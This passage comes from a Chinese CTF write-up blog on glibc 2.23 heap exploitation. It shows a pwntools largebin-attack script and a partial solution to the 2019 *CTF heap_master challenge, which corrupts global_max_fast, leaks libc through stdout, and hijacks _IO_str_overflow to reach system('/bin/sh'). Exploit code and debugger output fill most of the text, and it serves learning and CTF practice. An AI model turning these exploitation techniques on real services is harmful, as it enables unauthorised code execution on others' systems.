class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'1'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,message)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'2'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(idx))</span><br><span class="line">  p.recvuntil(<span class="string">'Content'</span>)</span><br><span class="line">  p.send(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'Choice'</span>)</span><br><span class="line">  p.sendline(<span class="string">'3'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">  p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#1  400+覆盖之后太小了</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#2 --&gt; 可以删掉它，更新chunk list然后达到overlap的目的</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e0</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)<span class="comment"># free -&gt;chunk5 but chunk8 here</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#构造一个largebin 一个unsortedbin</span></span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment">#chunk5-&gt;largebin </span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#chunk2-&gt;unsortedbin</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#largebin attack</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0xabcd0100</span></span><br><span class="line">fakechunk = target<span class="number">-0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x4f1</span>) + p64(<span class="number">0</span>) + p64(fakechunk)<span class="comment"># bk fackchunk-&gt;fd</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fakechunk+<span class="number">8</span>)   <span class="comment">#bk --&gt;fakechunk-&gt;bk</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fakechunk<span class="number">-0x18</span><span class="number">-5</span>)<span class="comment">#size 0x56</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload2)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span>+p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'666'</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>)*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="为什么size不能是0x55呢？"><a href="#为什么size不能是0x55呢？" class="headerlink" title="为什么size不能是0x55呢？"></a>为什么size不能是0x55呢？</h4><p>0x55&amp;0x2=0（绕不过check）<br>0x56&amp;0x2=2</p><p><img src="/2020/08/01/largebin-attack-glibc2-23/6.png" alt><br>（图片from：<a href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/</a>  ）</p><h5 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h5><p><a href="https://bbs.pediy.com/thread-254849.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-254849.htm</a><br><a href="http://blog.eonew.cn/archives/709" target="_blank" rel="noopener">http://blog.eonew.cn/archives/709</a></p><h3 id="2019-CTF-heap-master"><a href="#2019-CTF-heap-master" class="headerlink" title="2019 *CTF heap_master"></a>2019 *CTF heap_master</h3><p>这真是折磨死我的一道题啊，还有几种方法后续补吧</p><p>这道题确实挺有趣的，因为malloc的堆块和edit的free操作对应的堆块位置不同<br>edit和free的操作对象是mmap分配的地址段<br>然后它也没有show函数，所以就本能会想到IO_FILE的leak操作</p><h4 id="方法一：global-max-fast-unsortedbin-attack-IO-flash-all-lockp"><a href="#方法一：global-max-fast-unsortedbin-attack-IO-flash-all-lockp" class="headerlink" title="方法一：global_max_fast+unsortedbin attack+IO_flash_all_lockp:"></a>方法一：global_max_fast+unsortedbin attack+IO_flash_all_lockp:</h4><p><strong>参考blog:</strong> <a href="https://shift-crops.hatenablog.com/entry/2019/04/30/131154#heap-master-Pwn-740pt-8-solves" target="_blank" rel="noopener">https://shift-crops.hatenablog.com/entry/2019/04/30/131154#heap-master-Pwn-740pt-8-solves</a></p><p>global_max_fast：</p><p>关于开头的global_max_fast的使用，其实不是很明白，后来试了试别的地址，发现不改global_max_fast的值，就会报错溢出，至于为啥还是不是很懂<br>–后续–<br>fastbin  free完之后是不用在next chunk的prev_size位赋值的，所以这题free 0xf1大小的堆块理应是有prev_size位的，但是他没有所以会报错。<br><img src="/2020/08/01/largebin-attack-glibc2-23/7,png" alt></p><p>其他chunk free完是会有的</p><p><img src="/2020/08/01/largebin-attack-glibc2-23/8.png" alt></p><p>好的，global_max_fast改值之后就可以用fastbin操作了（uaf等，uaf是主要），基本上我们要控制stdou的内容的话，用的最多的方法就是uaf、largebin attack，</p><p>UAF：同一段chunk，用溢出改写chunk的size位，构造出不同size的free chunk，然后通过溢出修改free chunk的fd，再malloc两次就可以达到任意地址写了（size与构造的fake chunk的size要一致）</p><p><img src="/2020/08/01/largebin-attack-glibc2-23/9.png" alt></p><p>这题的话吧，因为malloc的堆不可用<br>bk指针改成global_max_fast，malloc 之后就是把global的值赋值成了main_arena,然后main_arena里面写入global的值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x57af5000</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x57af5000</span></span><br><span class="line">BK: <span class="number">0x7ffff7dd37e8</span> (free_list) ◂— <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7ffff7dd1b78</span>                                                             </span><br><span class="line"><span class="number">0x7ffff7dd1b78</span> &lt;main_arena+<span class="number">88</span>&gt;: <span class="number">0x0000555555757020</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b88</span> &lt;main_arena+<span class="number">104</span>&gt;:        <span class="number">0x0000000057af5000</span>      <span class="number">0x00007ffff7dd37e8</span></span><br><span class="line"><span class="number">0x7ffff7dd1b98</span> &lt;main_arena+<span class="number">120</span>&gt;:        <span class="number">0x00007ffff7dd1b88</span>      <span class="number">0x00007ffff7dd1b88</span></span><br><span class="line"><span class="number">0x7ffff7dd1ba8</span> &lt;main_arena+<span class="number">136</span>&gt;:        <span class="number">0x00007ffff7dd1b98</span>      <span class="number">0x00007ffff7dd1b98</span></span><br><span class="line"><span class="number">0x7ffff7dd1bb8</span> &lt;main_arena+<span class="number">152</span>&gt;:        <span class="number">0x00007ffff7dd1ba8</span>      <span class="number">0x00007ffff7dd1ba8</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/largebin-attack-glibc2-23/10.png" alt></p><p>改chunk_size，为0xf1，是为了free之后进入main_arena 的位置是在main_arena+e*8的上<br>再free一次，(free的是mmap段），让main_arena段的fd和bk都同时指向mmap（恢复未被unsorted bin attack之前的状态）</p><p><img src="/2020/08/01/largebin-attack-glibc2-23/11.png" alt></p><p><img src="/2020/08/01/largebin-attack-glibc2-23/12.png" alt></p><p>再将bk写入stdout的低字节，malloc更改IO_read_end 的地址为main_arena+88<br>又按照上面恢复，继续往bk里面写入stdout+0x10的低字节，malloc将IO_write_base的地址也改成了main_arena+88<br><code>(write_base=read_end效果等效于flag位改成0xfbad1800)</code><br>然后我们就可以leak出来了</p><p><img src="/2020/08/01/largebin-attack-glibc2-23/13.png" alt></p><p>触发IO_flush_all_lockp：</p><p>接着就开始构造getshell的办法了，这里用的是触发IO_flush_all_lockp，读取数据到栈上，最终实现实现rop</p><p>step1:<br>构造fake FILE结构：让stdout指向main_arena，再通过edit size把main_arena+88+0x68的位置上填上mmap的地址(stderr被改成mmap段)<br>step2:<br>在mmap段上_IO_str_overflow伪造劫持控制流：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.24 /libio/strops.c</span></span><br><span class="line"><span class="keyword">int</span> _IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">//pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span>  <span class="comment">//pass</span></span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *new_buf;</span><br><span class="line">    <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">    <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">    _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;  <span class="comment">//这里写上"/bin/sh"</span></span><br><span class="line">    <span class="keyword">if</span> (new_size &lt; old_blen) <span class="comment">//pass</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    new_buf = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); <span class="comment">//这里写上system的地址</span></span><br><span class="line">    <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/*    __ferror(fp) = 1; */</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (old_buf)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">        (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">        <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line">        fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">    _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">    fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">    fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">    fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">    fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">    fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过检测满足的条件有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.f</span>p-&gt;_flags &amp; _IO_NO_WRITES为假</span><br><span class="line"><span class="number">2.</span>pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only为真，即(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base + flush_only</span><br><span class="line"><span class="number">3.f</span>p-&gt;_flags &amp; _IO_USER_BUF为假</span><br><span class="line"><span class="number">4.</span>_IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span> 指向<span class="string">"/bin/sh"</span></span><br><span class="line"><span class="number">5.</span>(*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)指向system的地址</span><br></pre></td></tr></table></figure><p>new_size是放调用函数的参数的地方</p><p>所以我们构造四个地方：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IO_write_ptr  :  <span class="number">0xffffffffffff</span>     (&gt;IO_buf_end)</span><br><span class="line">IO_buf_end  :   (参数存放地址-0x64)/2，比如system('/bin/sh'),存放参数的地址就是/bin/sh的地址</span><br><span class="line">vtable  :   _IO_str_jumps</span><br><span class="line">fp-&gt;_s._allocate_buffer（vtable+<span class="number">0x8</span>，偏移是<span class="number">0xe0</span>）  :  调用函数的地址</span><br></pre></td></tr></table></figure><p>所以在exit的时候调用IO_flush_all_lockp会遍历IO_list_all的全部结点找到合适的去执行<code>IO_overflow,_IO_str_jumps-&gt;_IO_str_overflow</code>,<br>脚本里是用了gets，把rop输入到栈上，然后用ret填满，最后执行rop</p><p><img src="/2020/08/01/largebin-attack-glibc2-23/14.png" alt></p><h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><p>大佬的脚本模板项目：<a href="https://github.com/shift-crops/sc_expwn" target="_blank" rel="noopener">https://github.com/shift-crops/sc_expwn</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> sc_expwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment"># self.sendline('1')</span></span><br><span class="line"><span class="comment"># self.sendline(str(size))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    <span class="comment"># if self.wait:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(len(content)))</span><br><span class="line">    p.sendafter(<span class="string">'content: '</span>, content)</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sendline('2')</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(offset))</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(len(content)))</span></span><br><span class="line">        <span class="comment">#     self.send(content)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">p.sendline(str(len(content)))</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(offset)</span>:</span></span><br><span class="line"><span class="comment"># if self.wait:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment"># self.sendline('3')</span></span><br><span class="line"><span class="comment"># self.sendline(str(offset))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_</span><span class="params">(offset)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">libc_guess = <span class="number">0x7ffff7a0d000</span></span><br><span class="line">offset_libc_free_hook= libc_guess +libc.symbols[<span class="string">'__free_hook'</span>] </span><br><span class="line"><span class="keyword">print</span> hex(offset_libc_free_hook)</span><br><span class="line">offset_max_fast   = offset_libc_free_hook +<span class="number">0x50</span></span><br><span class="line"><span class="comment"># offset_max_fast=libc_guess+libc.symbols['global_max_fast']</span></span><br><span class="line">offset_libc_stdout=libc_guess+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x8</span>,p64(<span class="number">0x91</span>)) <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0x98</span>, p64(<span class="number">0x21</span>)) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0xb8</span>, p64(<span class="number">0x21</span>)) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">0x10</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_max_fast<span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line">malloc(<span class="number">0x80</span>)<span class="comment">#global_max_fast 赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">edit(<span class="number">0xf8</span>, p64(<span class="number">0x11</span>)) </span><br><span class="line"></span><br><span class="line">free(<span class="number">0x10</span>)</span><br><span 